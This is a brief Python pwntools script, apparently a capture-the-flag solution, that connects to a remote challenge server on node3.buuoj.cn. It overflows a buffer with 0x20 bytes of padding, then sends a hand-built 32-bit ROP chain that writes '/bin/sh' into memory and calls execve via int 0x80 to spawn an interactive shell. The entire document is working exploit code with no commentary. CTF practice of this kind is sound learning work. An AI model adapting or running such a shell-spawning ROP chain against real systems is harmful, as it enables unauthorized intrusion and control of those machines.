from pwn import *
from struct import pack

r = remote('node3.buuoj.cn', 26920)

p = pack('<I', 0x0806e82a)  # pop edx ; ret
p += pack('<I', 0x080ea060)  # @ .data
p += pack('<I', 0x080bae06)  # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x0809a15d)  # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806e82a)  # pop edx ; ret
p += pack('<I', 0x080ea064)  # @ .data + 4
p += pack('<I', 0x080bae06)  # pop eax ; ret
p += b'/sh\x00'
p += pack('<I', 0x0809a15d)  # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080bae06)  # pop eax ; ret
p += pack('<I', 0xB)
p += pack('<I', 0x0806e850)  # pop edx ; pop ecx ; pop ebx ; ret
p += pack('<I', 0x0)
p += pack('<I', 0x0)
p += pack('<I', 0x080ea060)  # @ .data
p += pack('<I', 0x080493e1)  # int 0x80
r.recvuntil('input :')
r.send(b'a' * 0x20 + p)
r.interactive()
